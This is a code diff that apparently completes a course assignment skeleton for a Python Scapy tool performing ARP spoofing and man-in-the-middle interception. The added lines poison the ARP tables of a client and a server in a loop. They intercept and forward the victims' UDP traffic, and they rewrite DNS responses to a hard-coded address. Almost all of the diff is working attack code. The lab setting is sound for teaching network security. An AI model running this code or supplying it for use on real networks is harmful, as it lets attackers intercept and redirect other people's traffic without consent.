@@ -26,32 +26,65 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=IP), timeout=3, verbose=0)
+    if ans:
+        print("# IP: ", IP, " maps to MAC: ", ans[0][1].src)
+        return ans[0][1].src
+    print("# No mac found")
     return
 
 
 def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
     while True:
-        spoof() # TODO: Spoof client ARP table
-        spoof() # TODO: Spoof server ARP table
+        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
+        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
         time.sleep(interval)
 
 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
+    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
+    send(arp_response, verbose=False)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
-
+    arp_response = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
+    send(arp_response, verbose=False)
 
 # TODO: handle intercepted packets
 # NOTE: this intercepts all packets that are sent AND received by the attacker, so 
 # you will want to filter out packets that you do not intend to intercept and forward
 def interceptor(packet):
     global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
+    
+    valid_ips_to_mac = {
+                clientIP: clientMAC,
+                serverIP: serverMAC
+            }
 
+    if IP in packet:
+        ip_src=packet[IP].src
+        ip_dst=packet[IP].dst
+
+        #if DNS in packet and ip_src == clientIP and ip_dst == dnsServerIP:
+            # print("*hostname:", packet[DNS].qd.qname.decode('utf-8'))
+
+        if DNS in packet and ip_src == serverIP and ip_dst == clientIP:
+            #print("*hostaddr:", packet[DNS].an.show())
+            #print(type(packet[DNS].an.rdata))
+            packet[DNS].an.rdata = '10.4.63.200'
+        
+        if UDP in packet and IP in packet and ip_src in valid_ips_to_mac and ip_dst in valid_ips_to_mac:
+            packet[Ether].src = attackerMAC
+            packet[Ether].dst = valid_ips_to_mac[ip_dst]
+            del packet[UDP].chksum
+            del packet[IP].chksum
+            del packet[UDP].len
+            del packet[IP].len
+            sendp(packet)
 
 if __name__ == "__main__":
     args = parse_arguments()
